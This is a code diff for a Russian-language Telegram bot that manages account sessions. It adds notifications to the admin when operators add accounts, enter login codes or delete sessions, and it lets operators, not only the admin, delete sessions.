@@ -32,6 +32,12 @@ OPERATORS = {
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
+async def notify_admin(text: str):
+    try:
+        await bot.send_message(ADMIN_ID, text, parse_mode="HTML")
+    except Exception:
+        pass
+
 OPERATORS_FILE = "operators.json"
 
 if os.path.exists(OPERATORS_FILE):
@@ -434,12 +440,17 @@ async def add_account_cmd(message: types.Message):
             permissions[uid].append(session_name)
             save_permissions()
 
+    if is_operator(message.from_user.id) and message.from_user.id != ADMIN_ID:
+        await notify_admin(
+            f"➕ <b>Оператор добавил аккаунт</b>\n"
+            f"👤 ID: {message.from_user.id}\n"
+            f"📞 Номер: {phone}"
+        )
+
     await message.answer(result, reply_markup=menu_kb)
 
 
 def build_account_keyboard(user_id: int, account_name: str):
-    user_id_str = str(user_id)
-
     state = phash_state.get(account_name, True)
     state_text = "🟢 База: ВКЛ" if state else "🔴 База: ВЫКЛ"
 
@@ -454,7 +465,10 @@ def build_account_keyboard(user_id: int, account_name: str):
 
     if is_operator(user_id):
         kb_buttons.append([
-            InlineKeyboardButton(text="🗑 Удалить сессию", callback_data=f"delete:{account_name}")
+            InlineKeyboardButton(
+                text="🗑 Удалить сессию",
+                callback_data=f"delete:{account_name}"
+            )
         ])
 
     return InlineKeyboardMarkup(inline_keyboard=kb_buttons)
@@ -613,7 +627,7 @@ async def clear_permissions_cmd(message: types.Message):
 # === УДАЛЕНИЕ СЕССИИ (через кнопку) ===
 @dp.callback_query(lambda c: c.data.startswith("delete:"))
 async def callback_delete_session(callback: types.CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
+    if not is_operator(callback.from_user.id):
         await callback.answer("⛔ Только админ может удалять сессии")
         return
 
@@ -651,6 +665,14 @@ async def callback_delete_session(callback: types.CallbackQuery):
     if removed_from:
         text += f"\n❎ Доступ удалён у пользователей: {', '.join(removed_from)}"
 
+    if is_operator(callback.from_user.id) and callback.from_user.id != ADMIN_ID:
+        await notify_admin(
+            f"🗑 <b>Оператор удалил сессию</b>\n"
+            f"👤 ID: {callback.from_user.id}\n"
+            f"📂 Аккаунт: {name}"
+        )
+
+
     await callback.message.answer(text, parse_mode="HTML", reply_markup=menu_kb)
     await callback.answer("✅ Удалено")
 
@@ -687,6 +709,14 @@ async def enter_code(message: types.Message):
                 await message.answer(f"✅ PHASH обработчик подключен для {name}")
             except Exception as e:
                 await message.answer(f"⚠️ Не удалось подключить PHASH для {name}: {e}")
+
+    if is_operator(message.from_user.id) and message.from_user.id != ADMIN_ID:
+        await notify_admin(
+            f"🔐 <b>Оператор ввёл код</b>\n"
+            f"👤 ID: {message.from_user.id}\n"
+            f"📂 Аккаунт: {name}"
+        )
+
 @dp.message(Command("password"))
 async def enter_password(message: types.Message):
     if not is_operator(message.from_user.id):
